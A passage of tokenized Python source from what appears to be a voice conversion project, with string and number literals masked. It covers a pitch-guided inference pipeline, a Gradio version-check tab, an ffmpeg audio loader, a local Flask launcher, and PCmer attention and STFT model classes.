) <EOL> pitchff [ pitchf > <NUM_LIT> ] = <NUM_LIT> <EOL> pitchff [ pitchf < <NUM_LIT> ] = protect <EOL> pitchff = pitchff . unsqueeze ( - <NUM_LIT> ) <EOL> feats = feats * pitchff + feats0 * ( <NUM_LIT> - pitchff ) <EOL> feats = feats . to ( feats0 . dtype ) <EOL> p_len = torch . tensor ( [ p_len ] , device = self . device ) . long ( ) <EOL> with torch . no_grad ( ) : <EOL> if pitch != None and pitchf != None : <EOL> audio1 = ( <EOL> ( net_g . infer ( feats , p_len , pitch , pitchf , sid ) [ <NUM_LIT> ] [ <NUM_LIT> , <NUM_LIT> ] ) <EOL> . data . cpu ( ) <EOL> . float ( ) <EOL> . numpy ( ) <EOL> ) <EOL> else : <EOL> audio1 = ( <EOL> ( net_g . infer ( feats , p_len , sid ) [ <NUM_LIT> ] [ <NUM_LIT> , <NUM_LIT> ] ) . data . cpu ( ) . float ( ) . numpy ( ) <EOL> ) <EOL> del feats , p_len , padding_mask <EOL> if torch . cuda . is_available ( ) : <EOL> torch . cuda . empty_cache ( ) <EOL> t2 = ttime ( ) <EOL> return audio1 <EOL> def pipeline ( <EOL> self , <EOL> model , <EOL> net_g , <EOL> sid , <EOL> audio , <EOL> input_audio_path , <EOL> f0_up_key , <EOL> f0_method , <EOL> file_index , <EOL> index_rate , <EOL> if_f0 , <EOL> filter_radius , <EOL> tgt_sr , <EOL> resample_sr , <EOL> rms_mix_rate , <EOL> version , <EOL> protect , <EOL> hop_length , <EOL> f0autotune , <EOL> f0_file = None , <EOL> ) : <EOL> if file_index != "<STR_LIT>" and os . path . exists ( file_index ) == True and index_rate != <NUM_LIT> : <EOL> try : <EOL> index = faiss . read_index ( file_index ) <EOL> big_npy = index . reconstruct_n ( <NUM_LIT> , index . ntotal ) <EOL> except Exception as error : <EOL> print ( error ) <EOL> index = big_npy = None <EOL> else : <EOL> index = big_npy = None <EOL> audio = signal . filtfilt ( bh , ah , audio ) <EOL> audio_pad = np . pad ( audio , ( self . window // <NUM_LIT> , self . window // <NUM_LIT> ) , mode = "<STR_LIT>" ) <EOL> opt_ts = [ ] <EOL> if audio_pad . shape [ <NUM_LIT> ] > self . t_max : <EOL> audio_sum = np . zeros_like ( audio ) <EOL> for i in range ( self . window ) : <EOL> audio_sum += audio_pad [ i : i - self . window ] <EOL> for t in range ( self . t_center , audio . shape [ <NUM_LIT> ] , self . t_center ) : <EOL> opt_ts . append ( <EOL> t <EOL> - self . t_query <EOL> + np . where ( <EOL> np . abs ( audio_sum [ t - self . t_query : t + self . t_query ] ) <EOL> == np . abs ( audio_sum [ t - self . t_query : t + self . t_query ] ) . min ( ) <EOL> ) [ <NUM_LIT> ] [ <NUM_LIT> ] <EOL> ) <EOL> s = <NUM_LIT> <EOL> audio_opt = [ ] <EOL> t = None <EOL> t1 = ttime ( ) <EOL> audio_pad = np . pad ( audio , ( self . t_pad , self . t_pad ) , mode = "<STR_LIT>" ) <EOL> p_len = audio_pad . shape [ <NUM_LIT> ] // self . window <EOL> inp_f0 = None <EOL> if hasattr ( f0_file , "<STR_LIT>" ) == True : <EOL> try : <EOL> with open ( f0_file . name , "<STR_LIT>" ) as f : <EOL> lines = f . read ( ) . strip ( "<STR_LIT>" ) . split ( "<STR_LIT>" ) <EOL> inp_f0 = [ ] <EOL> for line in lines : <EOL> inp_f0 . append ( [ float ( i ) for i in line . split ( "<STR_LIT>" ) ] ) <EOL> inp_f0 = np . array ( inp_f0 , dtype = "<STR_LIT>" ) <EOL> except Exception as error : <EOL> print ( error ) <EOL> sid = torch . tensor ( sid , device = self . device ) . unsqueeze ( <NUM_LIT> ) . long ( ) <EOL> pitch , pitchf = None , None <EOL> if if_f0 == <NUM_LIT> : <EOL> pitch , pitchf = self . get_f0 ( <EOL> input_audio_path , <EOL> audio_pad , <EOL> p_len , <EOL> f0_up_key , <EOL> f0_method , <EOL> filter_radius , <EOL> hop_length , <EOL> f0autotune , <EOL> inp_f0 , <EOL> ) <EOL> pitch = pitch [ : p_len ] <EOL> pitchf = pitchf [ : p_len ] <EOL> if self . device == "<STR_LIT>" : <EOL> pitchf = pitchf . astype ( np . float32 ) <EOL> pitch = torch . tensor ( pitch , device = self . device ) . unsqueeze ( <NUM_LIT> ) . long ( ) <EOL> pitchf = torch . tensor ( pitchf , device = self . device ) . unsqueeze ( <NUM_LIT> ) . float ( ) <EOL> t2 = ttime ( ) <EOL> for t in opt_ts : <EOL> t = t // self . window * self . window <EOL> if if_f0 == <NUM_LIT> : <EOL> audio_opt . append ( <EOL> self . vc ( <EOL> model , <EOL> net_g , <EOL> sid , <EOL> audio_pad [ s : t + self . t_pad2 + self . window ] , <EOL> pitch [ : , s // self . window : ( t + self . t_pad2 ) // self . window ] , <EOL> pitchf [ : , s // self . window : ( t + self . t_pad2 ) // self . window ] , <EOL> index , <EOL> big_npy , <EOL> index_rate , <EOL> version , <EOL> protect , <EOL> ) [ self . t_pad_tgt : - self . t_pad_tgt ] <EOL> ) <EOL> else : <EOL> audio_opt . append ( <EOL> self . vc ( <EOL> model , <EOL> net_g , <EOL> sid , <EOL> audio_pad [ s : t + self . t_pad2 + self . window ] , <EOL> None , <EOL> None , <EOL> index , <EOL> big_npy , <EOL> index_rate , <EOL> version , <EOL> protect , <EOL> ) [ self . t_pad_tgt : - self . t_pad_tgt ] <EOL> ) <EOL> s = t <EOL> if if_f0 == <NUM_LIT> : <EOL> audio_opt . append ( <EOL> self . vc ( <EOL> model , <EOL> net_g , <EOL> sid , <EOL> audio_pad [ t : ] , <EOL> pitch [ : , t // self . window : ] if t is not None else pitch , <EOL> pitchf [ : , t // self . window : ] if t is not None else pitchf , <EOL> index , <EOL> big_npy , <EOL> index_rate , <EOL> version , <EOL> protect , <EOL> ) [ self . t_pad_tgt : - self . t_pad_tgt ] <EOL> ) <EOL> else : <EOL> audio_opt . append ( <EOL> self . vc ( <EOL> model , <EOL> net_g , <EOL> sid , <EOL> audio_pad [ t : ] , <EOL> None , <EOL> None , <EOL> index , <EOL> big_npy , <EOL> index_rate , <EOL> version , <EOL> protect , <EOL> ) [ self . t_pad_tgt : - self . t_pad_tgt ] <EOL> ) <EOL> audio_opt = np . concatenate ( audio_opt ) <EOL> if rms_mix_rate != <NUM_LIT> : <EOL> audio_opt = change_rms ( audio , <NUM_LIT> , audio_opt , tgt_sr , rms_mix_rate ) <EOL> if resample_sr >= <NUM_LIT> and tgt_sr != resample_sr : <EOL> audio_opt = librosa . resample ( <EOL> audio_opt , orig_sr = tgt_sr , target_sr = resample_sr <EOL> ) <EOL> audio_max = np . abs ( audio_opt ) . max ( ) / <NUM_LIT> <EOL> max_int16 = <NUM_LIT> <EOL> if audio_max > <NUM_LIT> : <EOL> max_int16 /= audio_max <EOL> audio_opt = ( audio_opt * max_int16 ) . astype ( np . int16 ) <EOL> del pitch , pitchf , sid <EOL> if torch . cuda . is_available ( ) : <EOL> torch . cuda . empty_cache ( ) <EOL> return audio_opt <EOL> </s>
<s> import gradio as gr <EOL> from assets . version_checker import compare_version <EOL> from assets . i18n . i18n import I18nAuto <EOL> i18n = I18nAuto ( ) <EOL> def version_tab ( ) : <EOL> with gr . Row ( ) : <EOL> with gr . Column ( ) : <EOL> version_check = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> interactive = False , <EOL> ) <EOL> version_button = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> version_button . click ( <EOL> fn = compare_version , <EOL> inputs = [ ] , <EOL> outputs = [ version_check ] , <EOL> ) <EOL> </s>
<s> import ffmpeg <EOL> import numpy as np <EOL> import re <EOL> import unicodedata <EOL> def load_audio ( file , sampling_rate ) : <EOL> try : <EOL> file = file . strip ( "<STR_LIT>" ) . strip ( '<STR_LIT>' ) . strip ( "<STR_LIT>" ) . strip ( '<STR_LIT>' ) . strip ( "<STR_LIT>" ) <EOL> out , _ = ( <EOL> ffmpeg . input ( file , threads = <NUM_LIT> ) <EOL> . output ( "<STR_LIT>" , format = "<STR_LIT>" , acodec = "<STR_LIT>" , ac = <NUM_LIT> , ar = sampling_rate ) <EOL> . run ( cmd = [ "<STR_LIT>" , "<STR_LIT>" ] , capture_stdout = True , capture_stderr = True ) <EOL> ) <EOL> except Exception as error : <EOL> raise RuntimeError ( f"<STR_LIT>" ) <EOL> return np . frombuffer ( out , np . float32 ) . flatten ( ) <EOL> def format_title ( title ) : <EOL> formatted_title = ( <EOL> unicodedata . normalize ( "<STR_LIT>" , title ) . encode ( "<STR_LIT>" , "<STR_LIT>" ) . decode ( "<STR_LIT>" ) <EOL> ) <EOL> formatted_title = re . sub ( r"<STR_LIT>" , "<STR_LIT>" , formatted_title ) <EOL> formatted_title = re . sub ( r"<STR_LIT>" , "<STR_LIT>" , formatted_title ) <EOL> formatted_title = re . sub ( r"<STR_LIT>" , "<STR_LIT>" , formatted_title ) <EOL> return formatted_title <EOL> </s>
<s> import os <EOL> import socket <EOL> import subprocess <EOL> import time <EOL> import requests <EOL> import sys <EOL> import json <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> config_file = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" ) <EOL> env_path = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" ) <EOL> host = "<STR_LIT>" <EOL> port = <NUM_LIT> <EOL> sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) <EOL> sock . settimeout ( <NUM_LIT> ) <EOL> def start_flask ( ) : <EOL> try : <EOL> sock . connect ( ( host , port ) ) <EOL> print ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> print ( "<STR_LIT>" ) <EOL> sock . close ( ) <EOL> requests . post ( "<STR_LIT>" ) <EOL> time . sleep ( <NUM_LIT> ) <EOL> script_path = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> try : <EOL> subprocess . Popen ( <EOL> [ env_path , script_path ] , creationflags = subprocess . CREATE_NEW_CONSOLE <EOL> ) <EOL> except Exception as e : <EOL> print ( f"<STR_LIT>" ) <EOL> print ( e ) <EOL> except Exception as e : <EOL> sock . close ( ) <EOL> script_path = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> try : <EOL> subprocess . Popen ( <EOL> [ env_path , script_path ] , creationflags = subprocess . CREATE_NEW_CONSOLE <EOL> ) <EOL> except Exception as e : <EOL> print ( "<STR_LIT>" ) <EOL> print ( e ) <EOL> def load_config_flask ( ) : <EOL> with open ( config_file , "<STR_LIT>" ) as file : <EOL> config = json . load ( file ) <EOL> return config [ "<STR_LIT>" ] <EOL> def save_config ( value ) : <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as file : <EOL> config = json . load ( file ) <EOL> config [ "<STR_LIT>" ] = value <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as file : <EOL> json . dump ( config , file , indent = <NUM_LIT> ) <EOL> </s>
<s> from typing import Union <EOL> import torch . nn . functional as F <EOL> import numpy as np <EOL> import torch <EOL> import torch . nn as nn <EOL> from torch . nn . utils . parametrizations import weight_norm <EOL> from torchaudio . transforms import Resample <EOL> import os <EOL> import librosa <EOL> import soundfile as sf <EOL> import torch . utils . data <EOL> from librosa . filters import mel as librosa_mel_fn <EOL> import math <EOL> from functools import partial <EOL> from einops import rearrange , repeat <EOL> from local_attention import LocalAttention <EOL> from torch import nn <EOL> os . environ [ "<STR_LIT>" ] = "<STR_LIT>" <EOL> def load_wav_to_torch ( full_path , target_sr = None , return_empty_on_exception = False ) : <EOL> sampling_rate = None <EOL> try : <EOL> data , sampling_rate = sf . read ( full_path , always_2d = True ) <EOL> except Exception as error : <EOL> print ( f"<STR_LIT>" ) <EOL> if return_empty_on_exception : <EOL> return [ ] , sampling_rate or target_sr or <NUM_LIT> <EOL> else : <EOL> raise Exception ( error ) <EOL> if len ( data . shape ) > <NUM_LIT> : <EOL> data = data [ : , <NUM_LIT> ] <EOL> assert ( <EOL> len ( data ) > <NUM_LIT> <EOL> ) <EOL> if np . issubdtype ( data . dtype , np . integer ) : <EOL> max_mag = - np . iinfo ( <EOL> data . dtype <EOL> ) . min <EOL> else : <EOL> max_mag = max ( np . amax ( data ) , - np . amin ( data ) ) <EOL> max_mag = ( <EOL> ( <NUM_LIT> ** <NUM_LIT> ) + <NUM_LIT> <EOL> if max_mag > ( <NUM_LIT> ** <NUM_LIT> ) <EOL> else ( ( <NUM_LIT> ** <NUM_LIT> ) + <NUM_LIT> if max_mag > <NUM_LIT> else <NUM_LIT> ) <EOL> ) <EOL> data = torch . FloatTensor ( data . astype ( np . float32 ) ) / max_mag <EOL> if ( <EOL> torch . isinf ( data ) | torch . isnan ( data ) <EOL> ) . any ( ) and return_empty_on_exception : <EOL> return [ ] , sampling_rate or target_sr or <NUM_LIT> <EOL> if target_sr is not None and sampling_rate != target_sr : <EOL> data = torch . from_numpy ( <EOL> librosa . core . resample ( <EOL> data . numpy ( ) , orig_sr = sampling_rate , target_sr = target_sr <EOL> ) <EOL> ) <EOL> sampling_rate = target_sr <EOL> return data , sampling_rate <EOL> def dynamic_range_compression ( x , C = <NUM_LIT> , clip_val = <NUM_LIT> ) : <EOL> return np . log ( np . clip ( x , a_min = clip_val , a_max = None ) * C ) <EOL> def dynamic_range_decompression ( x , C = <NUM_LIT> ) : <EOL> return np . exp ( x ) / C <EOL> def dynamic_range_compression_torch ( x , C = <NUM_LIT> , clip_val = <NUM_LIT> ) : <EOL> return torch . log ( torch . clamp ( x , min = clip_val ) * C ) <EOL> def dynamic_range_decompression_torch ( x , C = <NUM_LIT> ) : <EOL> return torch . exp ( x ) / C <EOL> class STFT : <EOL> def __init__ ( <EOL> self , <EOL> sr = <NUM_LIT> , <EOL> n_mels = <NUM_LIT> , <EOL> n_fft = <NUM_LIT> , <EOL> win_size = <NUM_LIT> , <EOL> hop_length = <NUM_LIT> , <EOL> fmin = <NUM_LIT> , <EOL> fmax = <NUM_LIT> , <EOL> clip_val = <NUM_LIT> , <EOL> ) : <EOL> self . target_sr = sr <EOL> self . n_mels = n_mels <EOL> self . n_fft = n_fft <EOL> self . win_size = win_size <EOL> self . hop_length = hop_length <EOL> self . fmin = fmin <EOL> self . fmax = fmax <EOL> self . clip_val = clip_val <EOL> self . mel_basis = { } <EOL> self . hann_window = { } <EOL> def get_mel ( self , y , keyshift = <NUM_LIT> , speed = <NUM_LIT> , center = False , train = False ) : <EOL> sampling_rate = self . target_sr <EOL> n_mels = self . n_mels <EOL> n_fft = self . n_fft <EOL> win_size = self . win_size <EOL> hop_length = self . hop_length <EOL> fmin = self . fmin <EOL> fmax = self . fmax <EOL> clip_val = self . clip_val <EOL> factor = <NUM_LIT> ** ( keyshift / <NUM_LIT> ) <EOL> n_fft_new = int ( np . round ( n_fft * factor ) ) <EOL> win_size_new = int ( np . round ( win_size * factor ) ) <EOL> hop_length_new = int ( np . round ( hop_length * speed ) ) <EOL> if not train : <EOL> mel_basis = self . mel_basis <EOL> hann_window = self . hann_window <EOL> else : <EOL> mel_basis = { } <EOL> hann_window = { } <EOL> mel_basis_key = str ( fmax ) + "<STR_LIT>" + str ( y . device ) <EOL> if mel_basis_key not in mel_basis : <EOL> mel = librosa_mel_fn ( <EOL> sr = sampling_rate , n_fft = n_fft , n_mels = n_mels , fmin = fmin , fmax = fmax <EOL> ) <EOL> mel_basis [ mel_basis_key ] = torch . from_numpy ( mel ) . float ( ) . to ( y . device ) <EOL> keyshift_key = str ( keyshift ) + "<STR_LIT>" + str ( y . device ) <EOL> if keyshift_key not in hann_window : <EOL> hann_window [ keyshift_key ] = torch . hann_window ( win_size_new ) . to ( y . device ) <EOL> pad_left = ( win_size_new - hop_length_new ) // <NUM_LIT> <EOL> pad_right = max ( <EOL> ( win_size_new - hop_length_new + <NUM_LIT> ) // <NUM_LIT> , <EOL> win_size_new - y . size ( - <NUM_LIT> ) - pad_left , <EOL> ) <EOL> if pad_right < y . size ( - <NUM_LIT> ) : <EOL> mode = "<STR_LIT>" <EOL> else : <EOL> mode = "<STR_LIT>" <EOL> y = torch . nn . functional . pad ( y . unsqueeze ( <NUM_LIT> ) , ( pad_left , pad_right ) , mode = mode ) <EOL> y = y . squeeze ( <NUM_LIT> ) <EOL> spec = torch . stft ( <EOL> y , <EOL> n_fft_new , <EOL> hop_length = hop_length_new , <EOL> win_length = win_size_new , <EOL> window = hann_window [ keyshift_key ] , <EOL> center = center , <EOL> pad_mode = "<STR_LIT>" , <EOL> normalized = False , <EOL> onesided = True , <EOL> return_complex = True , <EOL> ) <EOL> spec = torch . sqrt ( spec . real . pow ( <NUM_LIT> ) + spec . imag . pow ( <NUM_LIT> ) + ( <NUM_LIT> ) ) <EOL> if keyshift != <NUM_LIT> : <EOL> size = n_fft // <NUM_LIT> + <NUM_LIT> <EOL> resize = spec . size ( <NUM_LIT> ) <EOL> if resize < size : <EOL> spec = F . pad ( spec , ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , size - resize ) ) <EOL> spec = spec [ : , : size , : ] * win_size / win_size_new <EOL> spec = torch . matmul ( mel_basis [ mel_basis_key ] , spec ) <EOL> spec = dynamic_range_compression_torch ( spec , clip_val = clip_val ) <EOL> return spec <EOL> def __call__ ( self , audiopath ) : <EOL> audio , sr = load_wav_to_torch ( audiopath , target_sr = self . target_sr ) <EOL> spect = self . get_mel ( audio . unsqueeze ( <NUM_LIT> ) ) . squeeze ( <NUM_LIT> ) <EOL> return spect <EOL> stft = STFT ( ) <EOL> def softmax_kernel ( <EOL> data , * , projection_matrix , is_query , normalize_data = True , eps = <NUM_LIT> , device = None <EOL> ) : <EOL> b , h , * _ = data . shape <EOL> data_normalizer = ( data . shape [ - <NUM_LIT> ] ** - <NUM_LIT> ) if normalize_data else <NUM_LIT> <EOL> ratio = projection_matrix . shape [ <NUM_LIT> ] ** - <NUM_LIT> <EOL> projection = repeat ( projection_matrix , "<STR_LIT>" , b = b , h = h ) <EOL> projection = projection . type_as ( data ) <EOL> data_dash = torch . einsum ( "<STR_LIT>" , ( data_normalizer * data ) , projection ) <EOL> diag_data = data ** <NUM_LIT> <EOL> diag_data = torch . sum ( diag_data , dim = - <NUM_LIT> ) <EOL> diag_data = ( diag_data / <NUM_LIT> ) * ( data_normalizer ** <NUM_LIT> ) <EOL> diag_data = diag_data . unsqueeze ( dim = - <NUM_LIT> ) <EOL> if is_query : <EOL> data_dash = ratio * ( <EOL> torch . exp ( <EOL> data_dash <EOL> - diag_data <EOL> - torch . max ( data_dash , dim = - <NUM_LIT> , keepdim = True ) . values <EOL> ) <EOL> + eps <EOL> ) <EOL> else : <EOL> data_dash = ratio * ( <EOL> torch . exp ( data_dash - diag_data + eps ) <EOL> ) <EOL> return data_dash . type_as ( data ) <EOL> def orthogonal_matrix_chunk ( cols , qr_uniform_q = False , device = None ) : <EOL> unstructured_block = torch . randn ( ( cols , cols ) , device = device ) <EOL> q , r = torch . linalg . qr ( unstructured_block . cpu ( ) , mode = "<STR_LIT>" ) <EOL> q , r = map ( lambda t : t . to ( device ) , ( q , r ) ) <EOL> if qr_uniform_q : <EOL> d = torch . diag ( r , <NUM_LIT> ) <EOL> q *= d . sign ( ) <EOL> return q . t ( ) <EOL> def exists ( val ) : <EOL> return val is not None <EOL> def empty ( tensor ) : <EOL> return tensor . numel ( ) == <NUM_LIT> <EOL> def default ( val , d ) : <EOL> return val if exists ( val ) else d <EOL> def cast_tuple ( val ) : <EOL> return ( val , ) if not isinstance ( val , tuple ) else val <EOL> class PCmer ( nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> num_layers , <EOL> num_heads , <EOL> dim_model , <EOL> dim_keys , <EOL> dim_values , <EOL> residual_dropout , <EOL> attention_dropout , <EOL> ) : <EOL> super ( ) . __init__ ( ) <EOL> self . num_layers = num_layers <EOL> self . num_heads = num_heads <EOL> self . dim_model = dim_model <EOL> self . dim_values = dim_values <EOL> self . dim_keys = dim_keys <EOL> self . residual_dropout = residual_dropout <EOL> self . attention_dropout = attention_dropout <EOL> self . _layers = nn . ModuleList ( [ _EncoderLayer ( self ) for _ in range ( num_layers ) ] ) <EOL> def forward ( self , phone , mask = None ) : <EOL> for i , layer in enumerate ( self . _layers ) : <EOL> phone = layer ( phone , mask ) <EOL> return phone <EOL> class _EncoderLayer ( nn . Module ) : <EOL> def __init__ ( self , parent : PCmer ) : <EOL> super ( ) . __init__ ( ) <EOL> self . conformer = ConformerConvModule ( parent . dim_model ) <EOL> self . norm = nn . LayerNorm ( parent . dim_model ) <EOL> self . dropout = nn . Dropout ( parent . residual_dropout ) <EOL> self . attn = SelfAttention ( <EOL> dim = parent . dim_model , heads = parent . num_heads , causal = False <EOL> ) <EOL> def forward ( self , phone , mask = None ) : <EOL> phone = phone + ( self . attn ( self . norm ( phone ) , mask = mask ) ) <EOL> phone = phone + ( self . conformer ( phone ) ) <EOL> return phone <EOL> def calc_same_padding ( kernel_size ) : <EOL> pad = kernel_size // <NUM_LIT> <EOL> return ( pad , pad - ( kernel_size + <NUM_LIT> ) % <NUM_LIT> ) <EOL> class Swish ( nn . Module ) : <EOL> def forward ( self , x ) : <EOL> return x * x . sigmoid ( ) <EOL> class Transpose ( nn . Module ) : <EOL> def __init__ ( self , dims ) : <EOL> super ( ) . __init__ ( ) <EOL> assert len ( dims ) == <NUM_LIT> , "<STR_LIT>" <EOL> self . dims = dims <EOL> def forward ( self , x ) : <EOL> return x . transpose ( * self . dims ) <EOL> class GLU ( nn . Module ) : <EOL> def __init__ ( self , dim ) : <EOL> super ( ) . __init__ ( ) <EOL> self . dim = dim <EOL> def forward ( self , x ) : <EOL> out , gate = x . chunk ( <NUM_LIT> , dim = self . dim ) <EOL> return out * gate . sigmoid ( ) <EOL> class DepthWiseConv1d ( nn . Module ) : <EOL> def __init__ ( self , chan_in , chan_out , kernel_size , padding ) : <EOL> super ( ) . __init__ ( ) <EOL> self . padding = padding <EOL> self . conv = nn . Conv1d ( chan_in , chan_out , kernel_size , groups = chan_in ) <EOL> def forward ( self , x ) : <EOL> x = F . pad ( x , self . padding ) <EOL> return self . conv ( x ) <EOL> class ConformerConvModule ( nn . Module ) : <EOL> def __init__ ( <EOL> self , dim , causal = False , expansion_factor = <NUM_LIT> , kernel_size = <NUM_LIT> , dropout = <NUM_LIT> <EOL> ) : <EOL> super ( ) . __init__ ( ) <EOL> inner_dim = dim * expansion_factor <EOL> padding = calc_same_padding ( kernel_size ) if not causal else ( kernel_size - <NUM_LIT> , <NUM_LIT> ) <EOL> self . net = nn . Sequential ( <EOL> nn . LayerNorm ( dim ) , <EOL> Transpose ( ( <NUM_LIT> , <NUM_LIT> ) ) , <EOL> nn . Conv1d ( dim , inner_dim * <NUM_LIT> , <NUM_LIT> ) , <EOL> GLU ( dim = <NUM_LIT> ) , <EOL> DepthWiseConv1d ( <EOL> inner_dim , inner_dim , kernel_size = kernel_size , padding = padding <EOL> ) , <EOL> Swish ( ) , <EOL> nn . Conv1d ( inner_dim , dim , <NUM_LIT> ) , <EOL> Transpose ( ( <NUM_LIT> , <NUM_LIT> ) ) , <EOL> nn . Dropout ( dropout ) , <EOL> ) <EOL> def forward ( self , x ) : <EOL> return self . net ( x ) <EOL> def linear_attention ( q , k , v ) : <EOL> if v is None : <EOL> out = torch . einsum ( "<STR_LIT>" , k , q ) <EOL> return out <EOL> else : <EOL> k_cumsum = k . sum ( dim = - <NUM_LIT> ) <EOL> D_inv = <NUM_LIT> / ( torch . einsum ( "<STR_LIT>" , q , k_cumsum . type_as ( q ) ) + <NUM_LIT> ) <EOL> context = torch . einsum ( "<STR_LIT>" , k , v ) <EOL> out = torch . einsum ( "<STR_LIT>" , context , q , D_inv ) <EOL> return out <EOL> def gaussian_orthogonal_random_matrix ( <EOL> nb_rows , nb_columns , scaling = <NUM_LIT> , qr_uniform_q = False , device = None <EOL> ) : <EOL> nb_full_blocks = int ( nb_rows / nb_columns ) <EOL> block_list = [ ] <EOL> for _ in range ( nb_full_blocks ) : <EOL> q = orthogonal_matrix_chunk ( <EOL> nb_columns , qr_uniform_q = qr_uniform_q , device = device <EOL> ) <EOL> block_list . append ( q ) <EOL> remaining_rows = nb_rows - nb_full_blocks * nb_columns <EOL> if remaining_rows > <NUM_LIT> : <EOL> q = orthogonal_matrix_chunk ( <EOL> nb_columns , qr_uniform_q = qr_uniform_q , device = device <EOL> ) <EOL> block_list . append ( q [ : remaining_rows ] ) <EOL> final_matrix = torch . cat ( block_list ) <EOL> if scaling == <NUM_LIT> : <EOL> multiplier = torch . randn ( ( nb_rows , nb_columns ) , device = device ) . norm ( dim = <NUM_LIT> ) <EOL> elif scaling == <NUM_LIT> : <EOL> multiplier = math . sqrt ( ( float ( nb_columns ) ) ) * torch . ones ( <EOL> ( nb_rows , ) , device = device <EOL> ) <EOL> else : <EOL> raise ValueError ( f"<STR_LIT>" ) <EOL> return torch . diag ( multiplier ) @ final_matrix <EOL> class FastAttention ( nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> dim_heads , <EOL> nb_features = None , <EOL> ortho_scaling = <NUM_LIT> , <EOL> causal = False , <EOL> generalized_attention = False , <EOL> kernel_fn = nn . ReLU ( ) , <EOL> qr_uniform_q = False , <EOL> no_projection = False , <EOL> ) : <EOL> super ( ) . __init__ ( ) <EOL> nb_features = default ( nb_features , int ( dim_heads * math . log ( dim_heads ) ) ) <EOL> self . dim_heads = dim_heads <EOL> self . nb_features = nb_features <EOL> self . ortho_scaling = ortho_scaling <EOL> self . create_projection = partial ( <EOL> gaussian_orthogonal_random_matrix , <EOL> nb_rows = self . nb_features , <EOL> nb_columns = dim_heads , <EOL> scaling = ortho_scaling , <EOL> qr_uniform_q = qr_uniform_q , <EOL> ) <EOL> projection_matrix = self . create_projection ( ) <EOL> self . register_buffer ( "<STR_LIT>" , projection_matrix ) <EOL> self . generalized_attention = generalized_attention <EOL> self . kernel_fn = kernel_fn <EOL> self . no_projection = no_projection <EOL> self . causal = causal <EOL> @ torch . no_grad ( ) <EOL> def redraw_projection_matrix ( self ) : <EOL> projections = self . create_projection ( ) <EOL> self . projection_matrix . copy_ ( projections ) <EOL> del projections <EOL> def forward ( self , q , k , v ) : <EOL> device = q . device <EOL> if self . no_projection : <EOL> q = q . softmax ( dim = - <NUM_LIT> ) <EOL> k = torch . exp ( k ) if self . causal else k . softmax ( dim = - <NUM_LIT> ) <EOL> else : <EOL> create_kernel = partial ( <EOL> softmax_kernel , projection_matrix = self . projection_matrix , device = device <EOL> ) <EOL> q = create_kernel ( q , is_query = True ) <EOL> k = create_kernel ( k , is_query = False ) <EOL> attn_fn = linear_attention if not self . causal else self . causal_linear_fn <EOL> if v is None : <EOL> out = attn_fn ( q , k , None ) <EOL> return out <EOL> else : <EOL> out = attn_fn ( q , k , v ) <EOL> return out <EOL> class SelfAttention ( nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> dim , <EOL> causal = False , <EOL> heads = <NUM_LIT> , <EOL> dim_head = <NUM_LIT> , <EOL> local_heads = <NUM_LIT> , <EOL> local_window_size = <NUM_LIT> , <EOL> nb_features = None , <EOL> feature_redraw_interval = <NUM_LIT> , <EOL> generalized_attention = False , <EOL> kernel_fn = nn . ReLU ( ) , <EOL> qr_uniform_q = False , <EOL> dropout = <NUM_LIT> , <EOL> no_projection = False , <EOL> ) : <EOL> super ( ) . __init__ ( ) <EOL> assert dim % heads == <NUM_LIT> , "<STR_LIT>" <EOL> dim_head = default ( dim_head , dim // heads ) <EOL> inner_dim = dim_head * heads <EOL> self . fast_attention = FastAttention ( <EOL> dim_head , <EOL> nb_features , <EOL> causal = causal , <EOL> generalized_attention = generalized_attention , <EOL> kernel_fn = kernel_fn , <EOL> qr_uniform_q = qr_uniform_q , <EOL> no_projection = no_projection , <EOL> ) <EOL> self . heads = heads <EOL> self . global_heads = heads - local_heads <EOL> self . local_attn = ( <EOL> LocalAttention ( <EOL> window_size = local_window_size , <EOL> causal = causal , <EOL> autopad = True , <EOL> dropout = dropout , <EOL> look_forward = int ( not causal ) , <EOL> rel_pos_emb_config = ( dim_head , local_heads ) , <EOL> ) <EOL> if local_heads > <NUM_LIT> <EOL> else None <EOL> ) <EOL> self . to_q = nn . Linear ( dim , inner_dim ) <EOL> self . to_k = nn . Linear ( dim , inner_dim ) <EOL> self . to_v = nn . Linear ( dim , inner_dim ) <EOL> self . to_out = nn . Linear ( inner_dim , dim ) <EOL> self . dropout = nn . Dropout ( dropout ) <EOL> @ torch . no_grad ( ) <EOL> def redraw_projection_matrix ( self ) : <EOL> self . fast_attention . redraw_projection_matrix ( ) <EOL> def forward ( <EOL> self , <EOL> x , <EOL> context = None , <EOL> mask = None , <EOL> context_mask = None , <EOL> name = None , <EOL> inference = False , <EOL> ** kwargs , <EOL> ) : <EOL> _ , _ , _ , h , gh = * x . shape , self . heads , self . global_heads <EOL> cross_attend = exists ( context ) <EOL> context = default ( context , x ) <EOL> context_mask = default ( context_mask , mask ) if not cross_attend else context_mask <EOL> q , k , v = self . to_q ( x ) , self . to_k ( context ) , self . to_v ( context ) <EOL> q , k , v = map ( lambda t : rearrange ( t , "<STR_LIT>" , h = h ) , ( q , k , v ) ) <EOL> ( q , lq ) , ( k , lk ) , ( v , lv ) = map ( lambda t : ( t [ : , : gh ] , t [ : , gh : ] ) , ( q , k , v ) ) <EOL> attn_outs = [ ] <EOL> if not empty ( q ) : <EOL> if exists ( context_mask ) : <EOL> global_mask = context_mask [ : , None , : , None ] <EOL> v . masked_fill_ ( ~ global_mask , <NUM_LIT> ) <EOL> if cross_attend : <EOL> pass <EOL> else : <EOL> out = 